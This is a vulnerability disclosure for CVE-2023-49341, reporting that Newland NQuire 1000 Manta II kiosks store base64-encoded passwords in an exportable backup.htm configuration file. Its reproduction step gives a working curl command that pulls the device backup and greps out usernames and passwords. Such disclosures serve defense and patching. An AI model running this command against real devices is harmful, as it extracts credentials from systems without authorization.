## Disclosure of CVE-2023-49341: Storing Passwords in a Recoverable Format into backup configuration file

**CVE ID:** CVE-2023-49341 <br>
**Researcher:** n0obit4 (Mr.EAX) <br>
**Vendor:** Newland EMEA <br>
**Product:** NQuire 1000 Manta II <br>
**Version:** NQ1000-II_G_V1.00.011

### Description:

The **Newland Nquire 1000** Interactive Kiosk suffer from **Storing Passwords in a Recoverable Format** by storing `base64 encoded password` into **backup.htm** configuration file, posing a severe risk to the confidentiality of sensitive information within the system.


**Tested on:** NQuire 1000 Manta II firmware == NQ1000-II_G_V1.00.011

### Details:

The identified vulnerability resides in the **backup.htm** configuration file, which contains the entire configuration of the device in JSON format. There is a **Password** key inside the **Miscellaneous Authentication** key object, containing a value encoded in Base64, which provides minimal security and can be easily decoded, exposing the passwords in a recoverable format.

### Steps to reproduce:

**Script to reproduce it**

```bash 
$ IP="<DEVICE IP ADDRESS>"
$ curl -s -XPOST http://$IP/backup.htm --data "action=backup" -H "Cookie: Token : 12345678" -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36" | grep -iE "username|password"
```

![](images/backup_passwords.png)

**Response:**

![](images/b64decode.png)

### References

- [CWE-257: Storing Passwords in a Recoverable Format](https://cwe.mitre.org/data/definitions/257.html)
- [CWE-285: Improper Authorization](https://cwe.mitre.org/data/definitions/285.html)
- [NQuire 1000 Manta II](https://www.newland-id.com/sites/default/files/documents/2022-02/Newland_NQuire1000_Manta_2_product-update.pdf)